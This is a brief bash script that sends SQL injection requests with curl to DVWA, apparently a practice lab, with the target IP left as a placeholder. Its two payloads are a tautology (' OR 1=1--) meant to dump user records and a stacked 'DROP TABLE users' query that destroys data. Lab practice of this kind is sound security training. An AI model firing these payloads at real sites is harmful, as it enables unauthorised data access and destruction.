#!/bin/bash
TARGET="INSERT DVWA IP:8080"

echo "=== SQL Injection Attacks ==="
curl -s "http://$TARGET/vulnerabilities/sqli/?id=1' OR 1=1--" | grep -i user
curl -s "http://$TARGET/vulnerabilities/sqli/?id=1; DROP TABLE users--" | grep -i error
